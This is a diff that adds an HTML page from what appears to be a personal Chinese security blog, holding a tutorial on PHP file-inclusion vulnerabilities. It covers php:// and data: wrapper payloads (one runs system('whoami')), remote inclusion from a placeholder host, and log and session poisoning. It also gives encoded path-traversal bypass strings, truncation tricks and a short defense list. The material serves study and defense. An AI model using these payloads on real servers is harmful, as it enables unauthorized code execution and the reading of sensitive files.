@@ -1,0 +1,308 @@
+<!DOCTYPE html><html lang="zh-CN "><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hongxiaodou || web-文件包含漏洞</title>
+    <meta name="author" content="hongxiaodou">
+    <meta name="description" content="林深不见鹿，山巅自相逢 ">
+    <meta name="keywords" content=" ">
+    <link rel="icon" href="/images/1.png">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/full-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<!-- hexo injector head_end start --><style>
+.body hanla:after {
+    content: ' ';
+    display: inline;
+    font-family: Arial;
+    font-size: 0.89em;
+}
+
+html code hanla,
+html pre hanla,
+html kbd hanla,
+html samp hanla {
+    display: none;
+}
+
+html ol > hanla,
+html ul > hanla {
+    display: none;
+}
+</style><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+
+    <div id="loading" style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent" style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#a3ddfb; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p><hanla></hanla>加载过慢请开启缓存<hanla></hanla>(浏览器默认开启)</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Hongxiaodou</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled">
+            </a-icon></span>
+            <span><hanla></hanla>主页</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled">
+            </a-icon></span>
+            <span><hanla></hanla>Hongxiaodou</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled">
+                    </a-icon></div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;"><hanla></hanla>主页</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1>web-文件包含漏洞 </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled">
+            </a-icon></span>
+            2021/8/5
+        </span>
+
+        
+        <span class="category">
+            <a href="/categories/web-文件操作安全">
+                <span class="icon">
+                    <a-icon type="book" theme="filled">
+                </a-icon></span>
+                web-文件操作安全
+            </a>
+        </span>
+        
+
+        
+    </div>
+
+    <div class="content" v-pre="">
+        <h1 id="基本"><a href="#基本" class="headerlink" title="基本"></a>基本</h1><p>相关函数<br><hanla></hanla>php<hanla></hanla>中引发文件包含漏洞的通常是以下四个函数：<br>    1.include()<br>    2.include_once()<br>    3.require()<br>    4.require_once()<br><hanla></hanla>require()<hanla></hanla>如果在的过程中有错，比如文件不存在等，则会直接退出，不执行后续语句。   </p>
+<span id="more"></span>
+
+
+<p><img src="https://i.loli.net/2021/08/05/oQ4613gKCi8NXxq.png" alt="1.png"></p>
+<h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><p><hanla></hanla>php<hanla></hanla>中引发文件包含漏洞的通常是以下四个函数：<br>1.include()<br>2.include_once()<br>3.require()<br>4.require_once()<br><hanla></hanla>require()<hanla></hanla>如果在的过程中有错，比如文件不存在等，则会直接退出，不执行后续语句。  </p>
+<p><img src="https://i.loli.net/2021/08/05/AdV2yL3krTeUpbE.png" alt="2.png"></p>
+<p>include() 如果出错的话，只会提出警告，会继续执行后续语句。  </p>
+<p><img src="https://i.loli.net/2021/08/05/uwyDqdaPpznhMjG.png" alt="3.png">   </p>
+<p><hanla></hanla>require_once() 和 include_once() 功能与<hanla></hanla>require() 和 include() 类似。但如果一个文件已经被包含过了，则 require_once() 和<br> include_once() 则不会再包含它，以避免函数重定义或变量重赋值等问题</p>
+<p><hanla></hanla>当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt<hanla></hanla>等等），都会直接作为<hanla></hanla>php<hanla></hanla>文件进行解析。测试代码：  </p>
+<p><img src="https://i.loli.net/2021/08/05/8vuaBT5XWmGSgI4.png" alt="4.png">   </p>
+<h2 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h2><p><hanla></hanla>1，具有相关的文件包含函数<br><hanla></hanla>2，文件包含函数中存在动态变量，比如<hanla></hanla>include $file<br><hanla></hanla>3,<hanla></hanla>攻击者能够控制该变量，比如<hanla></hanla>$file = $_GET[‘file’];</p>
+<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="LFI（-Local-File-Inclusion）"><a href="#LFI（-Local-File-Inclusion）" class="headerlink" title="LFI（(Local File Inclusion）"></a><hanla></hanla>LFI（(Local File Inclusion）</h3><p>本地文件包含漏洞，顾名思义，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏<br><hanla></hanla>洞都是<hanla></hanla>LFI。简单的测试用例如前所示。</p>
+<h3 id="RFI-Remote-File-Inclusion"><a href="#RFI-Remote-File-Inclusion" class="headerlink" title="RFI(Remote File Inclusion)"></a>RFI(Remote File Inclusion)</h3><p><hanla></hanla>远程文件包含漏洞。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此<br><hanla></hanla>漏洞一旦存在危害性会很大。但<hanla></hanla>RFI<hanla></hanla>的利用条件较为苛刻，需要<hanla></hanla>php.ini<hanla></hanla>中进行配置<br><hanla></hanla>allow_url_fopen = On<br>allow_url_include = On<br><hanla></hanla>两个配置选项均需要为<hanla></hanla>On，才能远程包含文件成功  </p>
+<p><img src="https://i.loli.net/2021/08/05/Yq8yHtsMBGoKre2.png" alt="5.png"> </p>
+<p><hanla></hanla>在<hanla></hanla>php.ini<hanla></hanla>中，allow_url_fopen<hanla></hanla>默认一直是<hanla></hanla>On，而<hanla></hanla>allow_url_include<hanla></hanla>从<hanla></hanla>php5.2<hanla></hanla>之后就默认为<hanla></hanla>Off。</p>
+<h2 id="包含姿势"><a href="#包含姿势" class="headerlink" title="包含姿势"></a>包含姿势</h2><p>下面例子中测试代码均为：   </p>
+<pre><code>&lt;?php       
+$file=$_GET['file'];      
+include $file;    
+?&gt;      
+</code></pre>
+<p>allow_url_fopen 默认为 Onallow_url_include 默认为 Off      </p>
+<h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a><hanla></hanla>php<hanla></hanla>伪协议</h2><p>各个脚本支持的协议  </p>
+<p><img src="https://i.loli.net/2021/08/05/ihotXuFjHwCfV5D.png" alt="6.png">     </p>
+<p><img src="https://i.loli.net/2021/08/05/K8YUsRDy5rjFWva.png" alt="7.png">      </p>
+<p><img src="https://i.loli.net/2021/08/05/oA1BDFIUYgfuMpq.png" alt="8.png">   </p>
+<p>伪协议详解：<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/endust/p/11804767.html">https://www.cnblogs.com/endust/p/11804767.html</a>  </p>
+<p>利用条件：<br>allow_url_include = On。<br><hanla></hanla>对<hanla></hanla>allow_url_fopen<hanla></hanla>不做要求。<br>姿势：  </p>
+<pre><code>    index.php    
+    ?file=php://input
+
+    POST:
+&lt;? phpinfo();?&gt;
+</code></pre>
+<p><img src="https://i.loli.net/2021/08/05/bmOKdqZLuohMACl.png" alt="9.png">   </p>
+<h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p><hanla></hanla>利用条件：<br>allow_url_include = On。<br><hanla></hanla>对<hanla></hanla>allow_url_fopen<hanla></hanla>不做要求。<br>姿势：反正我电脑不行  </p>
+<p><img src="https://i.loli.net/2021/08/05/a6uRHLirJjdN4hD.png" alt="10.png">  </p>
+<h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p><hanla></hanla>利用条件：无甚<br><hanla></hanla>127.0.0.1/ceshi/test.php?file=php://filter/read=convert.base64-encode/  resource=phpinfo.txt    </p>
+<p><hanla></hanla>通过指定末尾的文件，可以读取经<hanla></hanla>base64<hanla></hanla>加密后的文件源码，之后再<hanla></hanla>base64<hanla></hanla>解码一下就行。<br><hanla></hanla>虽然不能直接获取到<hanla></hanla>shell<hanla></hanla>等，但能读取敏感文件危害也是挺大的。</p>
+<p><img src="https://i.loli.net/2021/08/05/kwpPM2Hv8yl753F.png" alt="11.png"></p>
+<p>其他姿势：  </p>
+<p>127.0.0.1/ceshi/test.php?file=php://filter/convert.base64-encode/  resource=phpinfo.txt<br><hanla></hanla>效果跟前面一样，少了<hanla></hanla>read<hanla></hanla>等关键字。在绕过一些<hanla></hanla>waf<hanla></hanla>时也许有用。<br><hanla></hanla>用<hanla></hanla>base64<hanla></hanla>防止有些存在乱码  </p>
+<h3 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h3><p><hanla></hanla>利用条件：<br>phar://、zip://、bzip2://、zlib://<br><hanla></hanla>用于读取压缩文件，zip:// 、 bzip2:// 、 zlib://&nbsp;均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：jpg png gif xxx&nbsp;等等。<br><hanla></hanla>php<hanla></hanla>版本大于等于<hanla></hanla>php5.3.0<br><hanla></hanla>姿势： </p>
+<pre><code><hanla></hanla>假设有个文件<hanla></hanla>phpinfo.txt，其内容为  
+    <!--?php phpinfo();?--> 
+</code></pre>
+<p><hanla></hanla>，打包成<hanla></hanla>zip<hanla></hanla>压缩包，如下：<br><img src="https://i.loli.net/2021/08/05/1o6LiN3YaZgcQnC.png" alt="12.png"> </p>
+<p>指定绝对路径：<br>index.php?file=phar://D:/phpStudy/WWW/fileinclude/test.zip/phpinfo.txt<br><hanla></hanla>或者使用相对路径（这里<hanla></hanla>test.zip<hanla></hanla>就在当前目录下）<br>index.php?file=phar://test.zip/phpinfo.txt  </p>
+<p><img src="https://i.loli.net/2021/08/05/m2HGXvwdqNWErDo.png" alt="13.png"> </p>
+<h3 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h3><p><hanla></hanla>利用条件：<br><hanla></hanla>php<hanla></hanla>版本大于等于<hanla></hanla>php5.3.0<br><hanla></hanla>姿势：构造<hanla></hanla>zip<hanla></hanla>包的方法同<hanla></hanla>phar。<br><hanla></hanla>但使用<hanla></hanla>zip<hanla></hanla>协议，需要指定绝对路径，同时将<br><hanla></hanla>#编码为<hanla></hanla>%23，之后填上压缩包内的文件。   </p>
+<p><img src="https://i.loli.net/2021/08/05/rT5oOciBwHjxt4p.png" alt="14.png"> </p>
+<h3 id="data-URI-schema"><a href="#data-URI-schema" class="headerlink" title="data:URI schema"></a>data:URI schema</h3><p><hanla></hanla>利用条件：<br><hanla></hanla>php<hanla></hanla>版本大于等于<hanla></hanla>php5.2<br>allow_url_fopen = On<br>allow_url_include = On<br><hanla></hanla>姿势一：<br>    <code>index.php?file=data:text/plain,&lt;?php phpinfo();?&gt; </code><br><img src="https://i.loli.net/2021/08/05/qmXT4uhPVdyLE6n.png" alt="15.png"> </p>
+<p>姿势二：<br>index.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b<br><hanla></hanla>其中<hanla></hanla>PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==<hanla></hanla>的<hanla></hanla>base64<hanla></hanla>解码为：<br>    <code>&lt;?php system('whoami');?&gt;</code><br><img src="https://i.loli.net/2021/08/05/XoCAeigfbaUkvzt.png" alt="16.png"> </p>
+<h2 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a><hanla></hanla>包含<hanla></hanla>session</h2><p><hanla></hanla>利用条件：session<hanla></hanla>文件路径已知，且其中内容部分可控。<br>姿势：<br><hanla></hanla>php<hanla></hanla>的<hanla></hanla>session<hanla></hanla>文件的保存路径可以在<hanla></hanla>phpinfo<hanla></hanla>的<hanla></hanla>session.save_path<hanla></hanla>看到  </p>
+<p><img src="https://i.loli.net/2021/08/05/Ep19vOwXxQtCWcF.png" alt="17.png"> </p>
+<p><hanla></hanla>常见的<hanla></hanla>php-session<hanla></hanla>存放位置：<br>1./var/lib/php/sess_PHPSESSID<br>2./var/lib/php/sess_PHPSESSID<br>3./tmp/sessions/sess_PHPSESSID<br><hanla></hanla>4.session<hanla></hanla>的文件名格式为<hanla></hanla>sess_[phpsessid]  。而<hanla></hanla>phpsessid<hanla></hanla>在发送的请求的<hanla></hanla>cookie<hanla></hanla>字段中可以看到。  </p>
+<p><img src="https://i.loli.net/2021/08/05/Rtq6XeJVQzTasFC.png" alt="18.png"><br><hanla></hanla>要包含并利用的话，需要能控制部分<hanla></hanla>sesssion<hanla></hanla>文件的内容。暂时没有通用的办法。有些时候  ，可以先包含进<hanla></hanla>session<hanla></hanla>文件，观察里面的内容，然后根据里面的字段来发现可控的变量<br><hanla></hanla>，从而利用变量来写入<hanla></hanla>payload，并之后再次包含从而执行<hanla></hanla>php<hanla></hanla>代码。</p>
+<p>比如这篇文章：<a target="_blank" rel="noopener" href="https://kb.hitcon.org/post/165429468072/%E9%80%8F%E9%81%8E-lfi-%E5%BC%95%E5%85%A5-php-session-%E6%AA%94%E6%A1%88%E8%A7%B8%E7%99%BC-rce">https://kb.hitcon.org/post/165429468072/%E9%80%8F%E9%81%8E-lfi-%E5%BC%95%E5%85%A5-php-session-%E6%AA%94%E6%A1%88%E8%A7%B8%E7%99%BC-rce</a> </p>
+<h2 id="包含日志"><a href="#包含日志" class="headerlink" title="包含日志"></a>包含日志</h2><h3 id="访问日志"><a href="#访问日志" class="headerlink" title="访问日志"></a>访问日志</h3><p>利用条件： 需要知道服务器日志的存储路径，且日志文件可读。<br>姿势：<br><hanla></hanla>很多时候，web<hanla></hanla>服务器会将请求写入到日志文件中，比如说<hanla></hanla>apache。在用户发起请求时，会将<br><hanla></hanla>请求写入<hanla></hanla>access.log，当发生错误时将错误写入<hanla></hanla>error.log。默认情况下，日志保存路径在<br> /var/log/apache2/。<br><hanla></hanla>但如果是直接发起请求，会导致一些符号被编码使得包含无法正确解析。可以使用<hanla></hanla>burp<hanla></hanla>截包<br>后修改  </p>
+<p><img src="https://i.loli.net/2021/08/05/S8GjsrBkeav71V3.png" alt="19.png"> </p>
+<p><hanla></hanla>正常的<hanla></hanla>php<hanla></hanla>代码已经写入了 /var/log/apache2/access.log。然后进行包含即可。</p>
+<p><img src="https://i.loli.net/2021/08/05/pruNRfYUWHmSG9I.png" alt="20.png">  </p>
+<p><hanla></hanla>在一些场景中，log<hanla></hanla>的地址是被修改掉的。你可以通过读取相应的配置文件后，再进行包含。  </p>
+<h3 id="包含environ"><a href="#包含environ" class="headerlink" title="包含environ"></a><hanla></hanla>包含<hanla></hanla>environ</h3><p><hanla></hanla>利用条件：<br><hanla></hanla>php<hanla></hanla>以<hanla></hanla>cgi<hanla></hanla>方式运行，这样<hanla></hanla>environ<hanla></hanla>才会保持<hanla></hanla>UA<hanla></hanla>头。<br><hanla></hanla>environ<hanla></hanla>文件存储位置已知，且<hanla></hanla>environ<hanla></hanla>文件可读。<br>姿势：<br><hanla></hanla>proc/self/environ<hanla></hanla>中会保存<hanla></hanla>user-agent<hanla></hanla>头。如果在<hanla></hanla>user-agent<hanla></hanla>中插入<hanla></hanla>php<hanla></hanla>代码，则<hanla></hanla>php<hanla></hanla>代<br><hanla></hanla>码会被写入到<hanla></hanla>environ<hanla></hanla>中。之后再包含它，即可。</p>
+<h3 id="包含fd"><a href="#包含fd" class="headerlink" title="包含fd"></a><hanla></hanla>包含<hanla></hanla>fd</h3><p><hanla></hanla>跟包含<hanla></hanla>environ<hanla></hanla>类似。<br>参考  <a target="_blank" rel="noopener" href="https://highon.coffee/blog/lfi-cheat-sheet/#procselffd-lfi-method">https://highon.coffee/blog/lfi-cheat-sheet/#procselffd-lfi-method</a></p>
+<h3 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h3><p><hanla></hanla>php<hanla></hanla>中上传文件，会创建临时文件。在<hanla></hanla>linux<hanla></hanla>下使用<hanla></hanla>/tmp<hanla></hanla>目录，而在<hanla></hanla>windows<hanla></hanla>下使用<hanla></hanla>c:\<br><hanla></hanla>winsdows\temp<hanla></hanla>目录。在临时文件被删除之前，利用竞争即可包含该临时文件。<br><hanla></hanla>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux<hanla></hanla>下使用的随机函数有缺陷，而<hanla></hanla>window<hanla></hanla>下只有<hanla></hanla>65535<hanla></hanla>中不同的文件名，所以这个方法是可行的。<br><hanla></hanla>另一种方法是配合<hanla></hanla>phpinfo<hanla></hanla>页面的<hanla></hanla>php variables，可以直接获取到上传文件的存储路径和<br>临时文件名，直接包含即可。这个方法可以参考<a target="_blank" rel="noopener" href="https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf"><hanla></hanla>LFI With PHPInfo Assistance</a></p>
+<h3 id="包含上传文件"><a href="#包含上传文件" class="headerlink" title="包含上传文件"></a>包含上传文件</h3><p>利用条件：千变万化，不过至少得知道上传的文件在哪，叫啥名字。。。<br>姿势：<br>往往要配合上传的姿势，不说了，太多了。  </p>
+<h3 id="其余"><a href="#其余" class="headerlink" title="其余"></a>其余</h3><p><hanla></hanla>一个<hanla></hanla>web<hanla></hanla>服务往往会用到多个其他服务，比如<hanla></hanla>ftp<hanla></hanla>服务，数据库等等。这些应用也会产生相应的文件，但这就需要具体情况具体分析咯。这里就不展开了。  </p>
+<h2 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h2><p><hanla></hanla>接下来聊聊绕过姿势。平常碰到的情况肯定不会是简简单单的<hanla></hanla>include $_GET[‘file’]  ;这样直接把变量传入包含函数的。在很多时候包含的变量<hanla></hanla>/  文件不是完全可控的，比如下面这段代码指定了前缀和后缀：<br>    <code>&lt;?php       $file = $_GET['file'];       include '/var/www/html/'.$file.'/test/test.php';       ?&gt; </code> </p>
+<p><hanla></hanla>这样就很<hanla></hanla>“难”<hanla></hanla>直接去包含前面提到的种种文件</p>
+<h2 id="指定前缀"><a href="#指定前缀" class="headerlink" title="指定前缀"></a>指定前缀</h2><p>先考虑一下指定了前缀的情况吧。测试代码:<br>    <code>&lt;?php         $file = $_GET['file'];         include '/var/www/html/'.$file;     ?&gt;</code><br><hanla></hanla>目录遍历<br>这个最简单了，简要的提一下。<br><hanla></hanla>现在在<hanla></hanla>/var/log/test.txt<hanla></hanla>文件中有<hanla></hanla>php<hanla></hanla>代码<br>    <code>&lt;?php phpinfo();?&gt;</code><br><hanla></hanla>    ，则利用../<hanla></hanla>可以进行目录遍历，<br>比如我们尝试访问：<br>include.php?file=../../log/test.txt</p>
+<p><img src="https://i.loli.net/2021/08/05/bUkgF2vpRMKzQEB.png" alt="21.png"> </p>
+<h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><p><hanla></hanla>服务器端常常会对于../<hanla></hanla>等做一些过滤<br><hanla></hanla>利用<hanla></hanla>url<hanla></hanla>编码<br>../<br>%2e%2e%2f<br>..%2f<br>%2e%2e/<br>..\<br>%2e%2e%5c<br>..%5c<br>%2e%2e\<br>二次编码<br>../<br>%252e%252e%252f<br>..\<br>%252e%252e%255c<br><hanla></hanla>容器<hanla></hanla>/<hanla></hanla>服务器的编码方式<br>../<br>..%c0%af<br>%c0%ae%c0%ae/<br><hanla></hanla>注：java<hanla></hanla>中会把”%c0%ae”<hanla></hanla>解析为”\uC0AE”，最后转义为<hanla></hanla>ASCCII<hanla></hanla>字符的”.”（点）<br>Apache Tomcat Directory Traversal<br>..\<br>..%c1%9c </p>
+<h2 id="指定后缀"><a href="#指定后缀" class="headerlink" title="指定后缀"></a>指定后缀</h2><p>接着考虑指定后缀的情况。测试代码<br>    <code>&lt;?php         $file = $_GET['file'];         include $file.'/test/test.php';     ?&gt;</code>  </p>
+<h4 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h4><p><hanla></hanla>url<hanla></hanla>格式<br><hanla></hanla>protocol :// hostname[:port] / path / [;parameters][?query]#fragment<br><hanla></hanla>在远程文件包含漏洞（RFI）中，可以利用<hanla></hanla>query<hanla></hanla>或<hanla></hanla>fragment<hanla></hanla>来绕过后缀限制。<br>姿势一：query（？）<br>index.php?file=<a target="_blank" rel="noopener" href="http://remoteaddr/remoteinfo.txt">http://remoteaddr/remoteinfo.txt</a>?<br><hanla></hanla>则包含的文件为 <a target="_blank" rel="noopener" href="http://remoteaddr/remoteinfo.txt?/test/test.php">http://remoteaddr/remoteinfo.txt?/test/test.php</a><br><hanla></hanla>问号后面的部分<hanla></hanla>/test/test.php，也就是指定的后缀被当作<hanla></hanla>query<hanla></hanla>从而被绕过。  </p>
+<p><img src="https://i.loli.net/2021/08/05/yeVfrpnIXgGQt8B.png" alt="22.png"> </p>
+<p>姿势二：fragment（#）<br>index.php?file=<a target="_blank" rel="noopener" href="http://remoteaddr/remoteinfo.txt%23">http://remoteaddr/remoteinfo.txt%23</a><br><hanla></hanla>则包含的文件为 <a target="_blank" rel="noopener" href="http://remoteaddr/remoteinfo.txt#/test/test.php">http://remoteaddr/remoteinfo.txt#/test/test.php</a><br><hanla></hanla>问号后面的部分<hanla></hanla>/test/  test.php，也就是指定的后缀被当作<hanla></hanla>fragment<hanla></hanla>从而被绕过。<br><hanla></hanla>注意需要把#进行<hanla></hanla>url<hanla></hanla>编码为<hanla></hanla>%23</p>
+<p><img src="https://i.loli.net/2021/08/05/UFNpmKICcMDSwYu.png" alt="23.png"> </p>
+<h4 id="利用协议"><a href="#利用协议" class="headerlink" title="利用协议"></a>利用协议</h4><p><hanla></hanla>前面有提到过利用<hanla></hanla>zip<hanla></hanla>协议和<hanla></hanla>phar<hanla></hanla>协议。假设现在测试代码为：<br>    <code>&lt;?php         $file = $_GET['file'];         include $file.'/test/test.php';     ?&gt;</code><br><hanla></hanla>构造压缩包如下：<br><img src="https://i.loli.net/2021/08/05/2SlpUaw4reEkAHF.png" alt="24.png"> </p>
+<p><hanla></hanla>其中<hanla></hanla>test.php<hanla></hanla>内容为<br><code><hanla></hanla>&lt;?php phpinfo(); ?&gt;</code></p>
+<p><hanla></hanla>利用<hanla></hanla>zip<hanla></hanla>协议，注意要指定绝对路径<br><hanla></hanla>index.php?file=zip://D:\phpStudy\WWW\fileinclude\chybeta.zip%23chybeta</p>
+<p><img src="https://i.loli.net/2021/08/05/xwIDcH4gbelsarn.png" alt="25.png"> </p>
+<h4 id="长度截断"><a href="#长度截断" class="headerlink" title="长度截断"></a>长度截断</h4><p><hanla></hanla>利用条件： php<hanla></hanla>版本 &lt; php 5.2.8<br><hanla></hanla>目录字符串，在<hanla></hanla>linux<hanla></hanla>下<hanla></hanla>4096<hanla></hanla>字节时会达到最大值，在<hanla></hanla>window<hanla></hanla>下是<hanla></hanla>256<hanla></hanla>字节。只要不断的重<br>复./<br>index.php?file=././././。。。省略。。。././shell.txt<br><hanla></hanla>则后缀<hanla></hanla>/test/test.php，在达到最大值后会被直接丢弃掉。  </p>
+<h4 id="0字节截断"><a href="#0字节截断" class="headerlink" title="0字节截断"></a><hanla></hanla>0<hanla></hanla>字节截断</h4><p><hanla></hanla>利用条件： php<hanla></hanla>版本 &lt; php 5.3.4<br>index.php?file=phpinfo.txt%00</p>
+<p><img src="https://i.loli.net/2021/08/05/PdTApqB3IztHkwa.png" alt="26.png"></p>
+<h2 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h2><p><hanla></hanla>1.<hanla></hanla>在很多场景中都需要去包含<hanla></hanla>web<hanla></hanla>目录之外的文件，如果<hanla></hanla>php<hanla></hanla>配置了<hanla></hanla>open_basedir，则会包含<br>失败<br><hanla></hanla>2.<hanla></hanla>做好文件的权限管理<br><hanla></hanla>3.<hanla></hanla>对危险字符进行过滤等等  </p>
+
+    </div>
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <div id="comment">
+        <div id="gitalk-container">
+        </div>
+    </div>
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2018 - 2021 Hongxiaodou
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled"></a-icon></span>
+            @hongxiaodou
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> &amp; <a target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
+                });
+            }
+        }
+    })
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+        clientID: '',
+        clientSecret: '',
+        repo: 'hexo-theme-particle',      // The repository of store comments,
+        owner: 'korilin',
+        admin: ['korilin'],
+        language: 'zh-CN',
+        id: location.pathname,      // Ensure uniqueness and length less than 50
+        distractionFreeMode: true  // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+</script>
+
+
+
+</body></html>
